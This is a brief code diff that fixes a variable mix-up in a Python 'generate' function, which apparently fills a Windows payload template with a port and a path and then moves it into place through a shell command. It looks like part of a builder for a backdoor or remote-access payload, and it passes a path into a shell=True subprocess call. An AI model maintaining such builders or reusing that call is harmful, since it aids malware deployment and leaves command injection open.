@@ -41,7 +41,7 @@ def generate(data=''):
                 if l2 in line:
                     line = line.replace(l2, f"port = {port}")
                 if l3 in line:
-                    line = line.replace(l2, f"call = os.path.join(os.getcwd(), '{name}')")
+                    line = line.replace(l3, f"call = os.path.join(os.getcwd(), '{name}')")
                 sys.stdout.write(line)
             subprocess.run(f'move sources\\templates\\win.py "{path}"', capture_output=True, shell=True)
             print(f"Payload generated and saved as '{path}'")
